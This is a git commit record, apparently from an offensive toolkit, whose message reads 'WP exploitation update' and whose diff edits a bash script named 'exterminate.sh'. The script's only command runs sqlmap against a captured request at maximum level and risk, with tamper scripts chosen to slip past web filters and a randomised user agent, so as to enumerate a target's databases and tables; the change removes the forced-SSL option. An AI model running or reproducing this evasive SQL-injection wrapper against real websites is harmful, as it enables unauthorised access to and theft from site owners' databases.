f9e4d90059934554a8828e8354b5633c817b4448
yarscript <yar.yason@gmail.com>
2022-03-10 16:58:44 +0200

    WP exploitation update

--- dbabused/wp/exterminate.sh
+++ dbabused/wp/exterminate.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-python /var/www/exploit/sqlmap/sqlmap.py -r "$1" --dbs --tables --level=5 --risk=3 --threads=5 --dbms=mysql -v 3 --tamper="between,randomcase,space2comment" --random-agent --force-ssl
+python /var/www/exploit/sqlmap/sqlmap.py -r "$1" --dbs --tables --level=5 --risk=3 --threads=5 --dbms=mysql -v 3 --tamper="between,randomcase,space2comment" --random-agent
